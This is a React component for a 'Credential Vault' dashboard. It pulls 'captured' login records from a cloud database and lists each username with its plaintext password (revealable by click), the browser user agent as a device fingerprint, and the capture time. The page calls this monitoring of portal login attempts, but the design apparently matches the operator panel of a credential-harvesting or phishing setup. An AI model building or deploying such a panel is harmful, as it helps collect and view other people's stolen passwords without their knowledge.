import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  RefreshCcw, 
  Eye, 
  EyeOff, 
  Database, 
  Clock, 
  Monitor, 
  ChevronRight,
  AlertTriangle,
  ExternalLink,
  Search
} from 'lucide-react';
import { InternalDB } from '../services/internalDb.ts';
import { CapturedCredential } from '../types.ts';

const SecurityVault = () => {
  const [credentials, setCredentials] = useState<CapturedCredential[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [revealedIds, setRevealedIds] = useState<Set<number>>(new Set());
  const [searchTerm, setSearchTerm] = useState('');

  const loadVault = async () => {
    setIsLoading(true);
    const data = await InternalDB.getCapturedCredentials();
    setCredentials(data);
    setIsLoading(false);
  };

  useEffect(() => {
    loadVault();
  }, []);

  const toggleReveal = (id: number) => {
    const newRevealed = new Set(revealedIds);
    if (newRevealed.has(id)) newRevealed.delete(id);
    else newRevealed.add(id);
    setRevealedIds(newRevealed);
  };

  const filtered = credentials.filter(c => 
    c.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
    c.user_agent.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-6 animate-in fade-in duration-500 pb-12">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-red-600 rounded-2xl text-white shadow-lg shadow-red-200">
            <ShieldAlert size={28} />
          </div>
          <div>
            <h1 className="text-2xl font-black text-slate-800 tracking-tight">Credential Vault</h1>
            <p className="text-slate-500 text-sm font-medium">Monitoring internal portal authentication attempts.</p>
          </div>
        </div>
        <div className="flex gap-2">
          <button 
            onClick={loadVault}
            className="flex items-center gap-2 px-4 py-2.5 bg-white border border-slate-200 rounded-xl text-sm font-bold text-slate-700 hover:bg-slate-50 transition-all shadow-sm"
          >
            <RefreshCcw size={18} className={isLoading ? 'animate-spin' : ''} />
            Sync Database
          </button>
        </div>
      </div>

      {/* Warnings & Stats */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div className="bg-slate-900 p-6 rounded-3xl text-white space-y-4">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-black uppercase tracking-widest text-slate-400">Database Status</span>
            <div className="flex items-center gap-1.5">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
              <span className="text-[10px] font-bold text-green-500 uppercase">Live Connection</span>
            </div>
          </div>
          <div>
            <p className="text-4xl font-black">{credentials.length}</p>
            <p className="text-xs text-slate-400 mt-1 font-medium">Captured Records (Total)</p>
          </div>
          <div className="pt-2 border-t border-white/10 flex items-center gap-2 text-[10px] text-slate-400">
            <Database size={12} />
            <span>Supabase Cloud Sync: Active</span>
          </div>
        </div>

        <div className="md:col-span-2 bg-amber-50 border border-amber-100 p-6 rounded-3xl flex items-start gap-4">
          <div className="p-3 bg-amber-100 rounded-2xl text-amber-600">
            <AlertTriangle size={24} />
          </div>
          <div className="space-y-1">
            <h3 className="font-bold text-amber-900">Privileged Information Zone</h3>
            <p className="text-sm text-amber-800 leading-relaxed">
              This vault contains sensitive personnel access credentials. All views are audited. 
              Unauthorized export of this data is strictly prohibited under Corporate Policy 7.4.
            </p>
            <div className="pt-2 flex gap-4">
              <button className="text-[10px] font-black text-amber-600 uppercase tracking-widest hover:underline flex items-center gap-1">
                Download Audit Log <ExternalLink size={10} />
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Filter Bar */}
      <div className="bg-white p-2 rounded-2xl border border-slate-200 flex items-center gap-3 shadow-sm">
        <div className="pl-3 text-slate-400">
          <Search size={18} />
        </div>
        <input 
          type="text" 
          placeholder="Filter by username or device fingerprint..." 
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="flex-1 bg-transparent border-none outline-none text-sm font-medium text-slate-700 h-10"
        />
      </div>

      {/* Vault Table */}
      <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm">
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead>
              <tr className="bg-slate-50 border-b border-slate-100">
                <th className="px-6 py-4 text-[10px] font-black text-slate-400 uppercase tracking-widest">Identification</th>
                <th className="px-6 py-4 text-[10px] font-black text-slate-400 uppercase tracking-widest">Credential</th>
                <th className="px-6 py-4 text-[10px] font-black text-slate-400 uppercase tracking-widest">Device Metadata</th>
                <th className="px-6 py-4 text-[10px] font-black text-slate-400 uppercase tracking-widest text-right">Captured</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100">
              {isLoading ? (
                <tr>
                  <td colSpan={4} className="px-6 py-20 text-center">
                    <div className="flex flex-col items-center gap-3">
                      <RefreshCcw className="animate-spin text-blue-600" size={32} />
                      <p className="text-sm font-bold text-slate-400 uppercase tracking-widest">Deciphering Cloud Records...</p>
                    </div>
                  </td>
                </tr>
              ) : filtered.length === 0 ? (
                <tr>
                  <td colSpan={4} className="px-6 py-20 text-center">
                    <p className="text-sm font-bold text-slate-400 uppercase tracking-widest">No matching records in the vault.</p>
                  </td>
                </tr>
              ) : (
                filtered.map((cred) => (
                  <tr key={cred.id} className="hover:bg-slate-50/50 transition-colors group">
                    <td className="px-6 py-5">
                      <div className="flex items-center gap-3">
                        <div className="w-9 h-9 bg-slate-100 rounded-xl flex items-center justify-center text-slate-500 font-bold text-xs">
                          {cred.username.charAt(0).toUpperCase()}
                        </div>
                        <div>
                          <p className="text-sm font-black text-slate-800">{cred.username}</p>
                          <p className="text-[10px] text-blue-600 font-bold uppercase tracking-tighter">ID: REC-{cred.id.toString().padStart(4, '0')}</p>
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-5">
                      <div className="flex items-center gap-3 bg-slate-50 px-3 py-2 rounded-xl border border-slate-100 max-w-fit">
                        <span className="text-sm font-mono font-medium text-slate-700">
                          {revealedIds.has(cred.id) ? cred.password : '••••••••••••'}
                        </span>
                        <button 
                          onClick={() => toggleReveal(cred.id)}
                          className="text-slate-400 hover:text-slate-600 transition-colors"
                        >
                          {revealedIds.has(cred.id) ? <EyeOff size={16} /> : <Eye size={16} />}
                        </button>
                      </div>
                    </td>
                    <td className="px-6 py-5">
                      <div className="flex flex-col gap-1 max-w-[200px]">
                        <div className="flex items-center gap-1 text-[10px] font-bold text-slate-500 uppercase">
                          <Monitor size={10} />
                          Fingerprint
                        </div>
                        <p className="text-[10px] text-slate-400 truncate leading-tight italic" title={cred.user_agent}>
                          {cred.user_agent}
                        </p>
                      </div>
                    </td>
                    <td className="px-6 py-5 text-right">
                      <div className="flex flex-col items-end gap-1">
                        <div className="flex items-center gap-1 text-sm font-bold text-slate-800">
                          <Clock size={12} className="text-slate-400" />
                          {new Date(cred.captured_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </div>
                        <p className="text-[10px] font-bold text-slate-400 uppercase tracking-tighter">
                          {new Date(cred.captured_at).toLocaleDateString()}
                        </p>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default SecurityVault;